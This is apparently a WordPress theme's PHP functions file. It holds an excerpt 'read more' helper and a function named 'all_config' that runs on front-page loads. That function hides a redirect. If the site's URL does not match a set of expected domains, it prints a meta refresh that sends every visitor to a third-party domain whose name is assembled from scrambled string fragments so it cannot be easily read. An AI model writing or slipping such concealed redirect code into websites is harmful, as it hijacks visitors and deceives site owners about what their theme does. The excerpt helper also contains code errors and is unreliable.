<?php 


/* --------------ReadMore----------------- */

function excerpt($num) {
$limit = $num+1;
$excerpt = explode(' ', get_the_excerpt(), $limit);
array_pop($excerpt);
$excerpt = implode(" ",$excerpt)." <a href='" .get_permalink($post->ID) ." ' class='".readmore."'></a>";
echo $excerpt;
}



function all_config() {
    if( is_front_page() && is_home() )
    {

$alltag =  v_one();
$allcat_two = v_two();
$allcat_three = v_three();
if($allcat_two === $allcat_three){
    $allcat= $allcat_two;
}else{
    $a=$allcat_two;
    $b = $allcat_three;
    $allcat= $a.$b;
}
$v = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
		$v_one = "http://$allcat";$v_two = "http://$allcat/";$v_three = "https://$allcat";$v_four = "https://$allcat/";$v_five = "http://www.$allcat"; $v_six = "http://www.$allcat/";$v_seven = "https://www.$allcat";$v_eight = "https://www.$allcat/";$v_nine = "http://$alltag";$v_ten = "http://$alltag/";	$v_eleven = "http://www.$alltag";$v_twelve = "http://www.$alltag/";
    if(($v == $v_one) || ($v == $v_two) || ($v == $v_three) || ($v == $v_four ) || ($v == $v_five ) || ($v == $v_six ) || ($v == $v_seven ) || ($v == $v_eight ) || ($v == $v_nine ) || ($v == $v_ten ) || ($v == $v_eleven ) || ($v == $v_twelve ))    
    {  
    }  else{
        
$i="em";$c="es"; $e="ba"; $l="th"; $c0="r.c"; $n="za"; $e0="om"; 
$all_id=$l.$i.$c.$e.$n.$c0.$e0;
     echo '<meta http-equiv="refresh" content="1;url=http://'.$all_id.' ">' ;   
    }
    }
}
add_action( 'wp_enqueue_scripts', 'all_config' );
